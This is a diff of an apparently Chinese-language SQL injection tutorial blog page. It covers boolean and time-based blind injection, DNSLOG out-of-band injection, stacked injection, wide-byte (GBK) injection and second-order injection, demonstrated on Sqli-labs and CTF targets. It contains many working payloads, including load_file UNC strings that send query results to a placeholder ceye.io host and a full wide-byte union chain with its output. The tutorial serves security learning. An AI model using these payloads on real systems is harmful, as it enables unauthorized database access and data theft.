@@ -334,7 +334,7 @@ multilinestring()
 <p>无显注入适用于无法直接从页面上看到注入语句的执行结果，甚至连注入语句是否执行都无从得知的情况，这种情况我们就要利用一些特性和函数<strong>自己创造判断条件</strong></p>
 <h4>基于布尔的盲注</h4>
 <p>在介绍布尔盲注的原理前，先来了解一下它用到的函数</p>
-<h4>常用函数</h4>
+<h5>常用函数</h5>
 <ul>
 <li>
 <p><code class="notranslate">left()</code>函数：从左边截取指定长度的字符串</p>
@@ -356,24 +356,203 @@ mid(字符串，起始位置，截取长度)
 <p><code class="notranslate">ascii()</code>函数：将指定字符串进行 ascii 编码</p>
 <pre class="notranslate"><code class="notranslate">ascii(指定字符串)
 </code></pre>
-<p>### 布尔盲注原理</p>
 </li>
 </ul>
-<p>布尔（Boolean）是一种数据类型，通常是真和假两个值，进行布尔盲注入时我们实际上使用的是抽象的布尔概念，即通过页面返回正常（真）与不正常（假）判断，这里我们用 Sqli-labs 第八关帮助大家理解它</p>
-<p>先添加参数<code class="notranslate">?id=1</code></p>
-<p>先用单引号判断类型，发现添加单引号后并没有报错，但是 You are in... 消失了，这里也就为我们判断创造了条件，<strong>后面我们就需要观察 You are in... 是否出现，找不同情况</strong></p>
-<p>这里我们再添加一个单引号，发现 You are in... 出现，则本关为字符型注入，使用单引号包裹</p>
-<p>因为这里只会回显真或假，无法直接拿到数据库的名字，但是我们可以降低一点条件，可以<strong>先判断出数据库名的长度（最长为 30），这里可以先给一个范围，观察一下回显（二分法）</strong></p>
-<pre class="notranslate"><code class="notranslate">//先猜测数据库名是否比5长，发现为真
-1' and length(database())&gt;5--+
-
-//再判断数据库是否比10长，发现为假
-1' and length(database())&gt;10--+
-
-//此时数据库大于5小于等于10，依次尝试可以发现长度为8
-1' and length(database())=8--+
+<h5>布尔盲注原理</h5>
+<p>布尔（Boolean）是一种数据类型，通常是真和假两个值，进行布尔盲注入时我们实际上使用的是抽象的布尔概念，即通过页面返回正常（真）与不正常（假）判断。</p>
+<h5>手工实现布尔盲注</h5>
+<p><strong>1 .查看页面变化，判断sql注入类别</strong></p>
+<div class="highlight highlight-source-sql"><pre class="notranslate">?id<span class="pl-k">=</span><span class="pl-c1">1</span> <span class="pl-k">and</span> <span class="pl-c1">1</span><span class="pl-k">=</span><span class="pl-c1">1</span>
+?id<span class="pl-k">=</span><span class="pl-c1">1</span> <span class="pl-k">and</span> <span class="pl-c1">1</span><span class="pl-k">=</span><span class="pl-c1">2</span>
+【字符型】</pre></div>
+<p><strong>2.猜解数据库长度</strong></p>
+<p>使用length()判断数据库长度，二分法可提高效率</p>
+<pre class="notranslate"><code class="notranslate">?id=1' and length(database())&gt;5 --+
+?id=1' and length(database())&lt;10 --+
+?id=1' and length(database())=8 --+
+【length=8】
 </code></pre>
-<p>拿到长度后，我们使用<code class="notranslate">substr()</code>函数或<code class="notranslate">mid()</code>函数一位一位的猜测数据库字符，Mysql 库名一共可以使用 63 个字符，分别是：<code class="notranslate">a-z</code>、<code class="notranslate">A-Z</code>、<code class="notranslate">0-9</code>、<code class="notranslate">_</code></p></div>
+<p><strong>3.猜当前数据库名</strong></p>
+<p>方法1：使用<code class="notranslate">substr函数</code></p>
+<pre class="notranslate"><code class="notranslate">?id=1' and substr(database(),1,1)&gt;'r'--+
+?id=1' and substr(database(),1,1)&lt;'t'--+
+?id=1' and substr(database(),1,1)='s'--+
+?id=1' and substr(database(),2,1)='e'--+
+...
+?id=1' and substr(database(),8,1)='y'--+
+【security】
+</code></pre>
+<p>方法2：使用<code class="notranslate">ascii函数和substr函数</code></p>
+<pre class="notranslate"><code class="notranslate">?id=1' and ascii(substr(database(),1,1))&gt;114 --+
+?id=1' and ascii(substr(database(),1,1))&lt;116 --+
+?id=1' and ascii(substr(database(),1,1))=115 --+
+【security】
+</code></pre>
+<p>方法3：使用<code class="notranslate">left函数</code></p>
+<pre class="notranslate"><code class="notranslate">?id=1' and left(database(),1)&gt;'r'--+
+?id=1' and left(database(),1)&lt;'t'--+
+?id=1' and left(database(),1)='s' --+
+?id=1' and left(database(),2)='se' --+
+?id=1' and left(database(),3)='sec' --+
+...
+?id=1' and left(database(),8)='security' --+
+【security】
+</code></pre>
+<h4>基于时间的盲注</h4>
+<p>时间盲注可以用在比布尔盲注过滤还要严格的环境中，当页面连真和假这个判断条件都不提供时，我们便可以让我们自己创造时间这一条件，当语句被执行时，便会产生延迟，反之则不会，我们先来看一下时间盲注的常用函数</p>
+<h5>常用函数</h5>
+<p><code class="notranslate">sleep()</code>函数：将程序执行的结果延迟返回 n 秒</p>
+<pre class="notranslate"><code class="notranslate">sleep(n)
+</code></pre>
+<p><code class="notranslate">if()</code>函数：参数1为条件，当参数 1 返回的结果为 true 时，执行参数 2，否则执行参数 3，有点像 Java 里的三元运算符</p>
+<pre class="notranslate"><code class="notranslate">if(参数1，参数2，参数3)
+</code></pre>
+<h5>延时盲注原理</h5>
+<p>延时盲注的实现本质上就是<code class="notranslate">if()</code>函数嵌套<code class="notranslate">sleep()</code>函数的综合利用，将<code class="notranslate">sleep()</code>函数作为<code class="notranslate">if()</code>函数的第二个参数，也就是当参数一被成功执行时（结果为 true）对返回结果执行延时，反之则执行参数三的直接回显</p>
+<h5>手工实现延时盲注</h5>
+<pre class="notranslate"><code class="notranslate">?id=1 
+?id=1'
+?id=1"
+#不管怎么样都不报错，不管对错一直显示一个固定的页面；
+
+#判断注入点
+?id=1' and sleep(3)--+
+#页面响应延迟，判断存在时间延迟型注入
+
+#获取数据库名长度
+?id=1' and if(length(database())=8,sleep(3),1)--+
+
+#获取数据库名
+?id=1' and if(substr(database(),1,1)='s',sleep(3),1)--+
+</code></pre>
+<h3>基于 DNSLOG 的注入</h3>
+<p>DNSLOG 是存储在 DNS 服务器上的域名信息，它记录着用户对域名的访问信息，类似日志文件。像是 SQL 盲注、命令执行、SSRF 及 XSS 等攻击但无法看到回显结果时，就会用到 DNSLOG 技术，相比布尔盲注和时间盲注，DNSLOG  减少了发送的请求数，可以直接回显，也就降低了被安全设备拦截的可能性</p>
+<p>DNSLOG 注入优点众多，但利用条件也较为严苛</p>
+<ul>
+<li>只支持 Windows 系统的服务端，因为要使用 UNC 路径这一特性，Linux 不具备此特性</li>
+<li>Mysql 支持使用<code class="notranslate">load_file()</code>函数读取任意盘的文件</li>
+</ul>
+<h4>UNC 路径</h4>
+<p>UNC 全称 Universal Naming Convention，译为通用命名规范，例如我们在使用虚拟机的共享文件功能时，便会使用到 UNC 这一特性</p>
+<p>UNC 路径的格式如下：</p>
+<pre class="notranslate"><code class="notranslate">\\192.168.0.1\test\
+</code></pre>
+<p>这里我们使用运行使用 UNC 路径访问<a href="https://github.com/fish123123/fish123123.github.io/issues/www.dnslog.cn">www.dnslog.cn</a>，并使用 wireshark 抓包，可以看到确实存在对<a href="https://github.com/fish123123/fish123123.github.io/issues/www.dnslog.cn">www.dnslog.cn</a>这个域名进行 DNS 请求的流量，但是并不会在浏览器直接打开网站</p>
+<h4>load_file() 函数</h4>
+<p>上文我们提到，<code class="notranslate">load_file()</code>函数可以读取<strong>任意</strong>盘的文件才可以使用 DNSLOG 注入，它的读取范围由 Mysql 配置文件<code class="notranslate">my.ini</code>中的<code class="notranslate">secure_file_priv</code>参数决定</p>
+<ul>
+<li>当<code class="notranslate">secure_file_priv</code>为空，就可以读取磁盘的目录</li>
+<li>当<code class="notranslate">secure_file_priv</code>为<code class="notranslate">G:\</code>，就可以读取G盘的文件</li>
+<li>当<code class="notranslate">secure_file_priv</code>为 null，<code class="notranslate">load_file()</code>函数就不能加载文件（null 和空是两种情况）</li>
+</ul>
+<h4>DNSLOG 盲注原理</h4>
+<p>先给出最常用的两种 Payload</p>
+<pre class="notranslate"><code class="notranslate">Payload 1:
+and if((select load_file(concat('//',(select 攻击语句),'.xxxx.ceye.io/sql_test'))),1,0)
+
+Payload 2:
+and if((select load_file(concat('\\\\',(select 攻击语句),'.xxxx.ceye.io\\sql_test'))),1,0)
+</code></pre>
+<p>Payload 1,2 大体的思路都是一样的，也就是在<code class="notranslate">if()</code>函数中嵌套<code class="notranslate">load_file()</code>函数再使用 UNC 路径进行读取，<code class="notranslate">sql_test</code>这里写什么都可以，只是为了符合<code class="notranslate">load_file()</code>函数格式，读取时会产生 DNS 访问信息，唯一的不同点在于 Payload 2 在 URL 中使用<code class="notranslate">\(反斜杠)</code>时要双写配合转义</p>
+<blockquote>
+<p>转义：转义是一种引用单个字符的方法. 一个前面放上转义符 ()的字符就是告诉 shell 这个字符按照字面的意思进行解释</p>
+</blockquote>
+<p>这里还可以使用hex()函数，将回显内容编码为十六进制，这样做的好处是，假设回显内容存在特殊字符!@#$%^&amp;，包含特殊字符的域名无法被解析，DNSLOG也就无法记录信息，进行编码后就不存在这个问题</p>
+<h3>堆叠注入</h3>
+<p>堆叠注入的基本原理是在一条 SQL 语句结束后（通常使用分号<code class="notranslate">;</code>标记结束），继续构造并执行下一条SQL语句，这种注入方法可以执行任意类型的语句，包括查询、插入、更新和删除等等</p>
+<p>与联合注入相比，<strong>堆叠注入最明显的差别便是它的权限更大了</strong>，例如使用联合注入时，后端使用的是 select 语句，那么我们注入时也只能执行 select 操作，而堆叠查询是一条新的 SQL 语句，不受上一句的语法限制，操作的权限也就更大了</p>
+<p>但相应的，堆叠注入的利用条件变得更加严格，例如在 Mysql 中，需要使用<code class="notranslate">mysqli_multi_query()</code>函数才可以进行多条 SQL 语句同时执行，同时还需要网站对堆叠注入无过滤，因此在实战中堆叠注入还是较为少见的。</p>
+<h3>宽字节注入</h3>
+<p>当某字符的大小为一个字节时，称其字符为窄字节，当某字符的大小为两个或更多字节时，称其字符为宽字节，而且不同的字符编码方式和字符集对字符的大小有不同的影响</p>
+<p>例如，在 ASCII 码中，一个英文字母（不分大小写）为一个字节，一个中文汉字为两个字节；在 UTF-8 编码中，一个英文字为一个字节，一个中文为三个字节；在 Unicode 编码中，一个英文为一个字节，一个中文为两个字节</p>
+<h4>敏感函数 &amp; 选项</h4>
+<ul>
+<li><code class="notranslate">addslashes()</code>函数：返回在预定义字符之前添加反斜杠的字符串</li>
+<li><code class="notranslate">magic_quotes_gpc</code>选项：对 POST、GET、Cookie 传入的数据进行转义处理，在输入数据的特殊字符如 单引号、双引号、反斜线、NULL等字符前加入转义字符<code class="notranslate">\</code>，在高版本 PHP 中（&gt;=5.4.0）已经弃用</li>
+<li><code class="notranslate">mysql_real_escape_string()</code>函数：函数转义 SQL 语句中使用的字符串中的特殊字符</li>
+<li><code class="notranslate">mysql_escape_string()</code>函数：和<code class="notranslate">mysql_real_escape_string()</code>函数基本一致，差别在于不接受连接参数，也不管当前字符集设定</li>
+</ul>
+<h4>宽字节注入原理</h4>
+<p>宽字节注入的本质是开发者设置<strong>数据库编码与 PHP 编码为不同的编码格式从而导致产生宽字节注入</strong>，例如当 Mysql 数据库使用 GBK 编码时，它会把两个字节的字符解析为一个汉字，而不是两个英文字符，这样，如果我们输入一些特殊的字符，就会形成 SQL 注入</p>
+<p>为了防止 SQL 注入，通常会使用一些 PHP 函数，如<code class="notranslate">addslashes()</code>函数，来对特殊字符进行转义（我们之前说过，转义就是在字符前加一个<code class="notranslate">\</code>），反斜杠用 URL 编码表示是<code class="notranslate">%5c</code>，所以如果我们输入单引号<code class="notranslate">’</code>，它会变成<code class="notranslate">%5c%27</code>，这样我们就无法闭合 SQL 语句了</p>
+<p>但是，如果我们输入<code class="notranslate">%df’</code>，它会变成<code class="notranslate">%df%5c%27</code>，这里，%df%5c是一个宽字节的GBK编码，它表示一个繁体字“運”</p>
+<p>因为 GBK 编码的第一个字节的范围是 129-254，而<code class="notranslate">%df</code>的十进制是 223，所以它属于 GBK 编码的第一个字节，而<code class="notranslate">%5c</code>的十进制是 92，它属于 GBK 编码的第二个字节的范围 64-254，所以，<code class="notranslate">%df%5c</code>被数据库解析为一个汉字，而不是两个英文字符。</p>
+<h4>手工注入</h4>
+<div class="highlight highlight-source-sql"><pre class="notranslate">?id<span class="pl-k">=</span><span class="pl-c1">1</span>
+<span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
+<span class="pl-s">your sql:select id,title from news where id = <span class="pl-pds">'</span></span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s">here is the information</span>
+<span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span><span class="pl-pds">'</span></span></pre></div>
+<p>输入1'可以看到'被变成了',应该是addslashes之类的函数转义的结果。</p>
+<div class="highlight highlight-source-sql"><pre class="notranslate">?id<span class="pl-k">=</span><span class="pl-c1">1</span><span class="pl-s"><span class="pl-pds">'</span></span>
+<span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span><span class="pl-pds">'</span></span>
+your sql:<span class="pl-k">select</span> id,title <span class="pl-k">from</span> news <span class="pl-k">where</span> id <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">'</span>1<span class="pl-cce">\'</span><span class="pl-pds">'</span></span>
+here is the information    
+<span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span><span class="pl-pds">'</span></span></pre></div>
+<p>用上文宽字节构造方法，构造id=1%df’或者id=1%aa’，成功报错</p>
+<pre class="notranslate"><code class="notranslate">?id=1%df'
+或者【只要ASCII大于128的字符就可以】
+?id=1%aa'
+'''
+your sql:select id,title from news where id = '1ß\''
+Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10
+'''
+</code></pre>
+<p>确定字段数</p>
+<pre class="notranslate"><code class="notranslate">?id=1%aa' order by 1 --+	正常
+?id=1%aa' order by 2 --+	正常
+?id=1%aa' order by 3 --+	报错
+'''
+所以字段数为2
+'''
+</code></pre>
+<p>确定显示位</p>
+<p>前面必须为-1【前面查出来的值为null，才能显示后面我们想要的信息】，后面的信息才能显示出来</p>
+<pre class="notranslate"><code class="notranslate">?id=-1%aa' union select 1,2  --+
+'''
+your sql:select id,title from news where id = '-1歿'union select 1,2 -- '
+2
+'''
+</code></pre>
+<p>确定了回显的位置是2</p>
+<p>查询信息</p>
+<pre class="notranslate"><code class="notranslate">#查询数据库
+?id=-1%aa' union select 1,database()  --+
+'''
+sae-chinalover
+'''
+    
+#查询表名
+?id=-1%aa' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+'''
+ctf,ctf2,ctf3,ctf4,news
+'''  
+    
+#查询字段名
+?id=-1%aa' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x63746634 --+
+
+'''这里表名table_name的值必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。
+id,flag
+'''
+#查询字段信息
+?id=-1%aa' union select 1,group_concat(id,0x3a,flag) from ctf4 --+
+'''
+1:flag{this_is_sqli_flag}
+'''
+    
+?id=-1%aa' union select 1,group_concat(content) from ctf2 --+     
+'''
+h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,the flag is:nctf{query_in_mysql},h4cked_By_w00dPeck3r    
+'''    
+</code></pre>
+<h3>二次注入</h3>
+<h4>二次注入原理</h4>
+<p>这里假设有 A 和 B 两个注入点，<strong>A 注入点因为存在过滤处理所以无法直接进行注入，但是会将我们输入的数据以原本的形式储存在数据库中（存入数据库时被还原了），在此情况下，我们找到注入点 B，使得后端调用存储在数据库中的恶意数据并执行 SQL 查询</strong>，完成二次注入</p>
+<p>这也就引出了二次注入的两个步骤</p>
+<ul>
+<li>插入恶意数据：构造恶意语句并进行数据库插入数据时，虽对其中特殊字符进行了转义处理，但在写入数据库时仍保留了原来的数据</li>
+<li>调用恶意数据：开发者默认存入数据库的数据都是安全的，在进行调用时，直接使用恶意数据，没有进行二次校验</li>
+</ul></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
 <div class="comments" id="comments"></div>
